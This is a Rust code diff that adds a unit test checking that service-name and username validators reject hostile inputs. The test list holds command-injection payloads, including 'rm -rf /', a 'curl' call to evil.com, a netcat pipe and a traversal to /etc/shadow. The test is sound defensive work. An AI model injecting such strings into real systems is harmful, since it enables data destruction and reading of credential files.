@@ -161,3 +161,37 @@ pub fn validate_safe_path<P: AsRef<Path>>(path: P) -> Result<P> {
     }
     Ok(path)
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_adversarial_fuzzing_rejection() {
+        let malicious_inputs = [
+            "$(reboot)",
+            "; rm -rf /",
+            "| nc 127.0.0.1",
+            "& touch /tmp/pwn",
+            "$(curl http://evil.com)",
+            "`reboot`",
+            "%s%n",
+            "test\0null",
+            "../../etc/shadow",
+            "valid;rm",
+        ];
+
+        for input in malicious_inputs {
+            assert!(
+                validate_service_name(input).is_err(),
+                "validate_service_name failed to reject malicious input: {}",
+                input
+            );
+            assert!(
+                validate_username(input).is_err(),
+                "validate_username failed to reject malicious input: {}",
+                input
+            );
+        }
+    }
+}
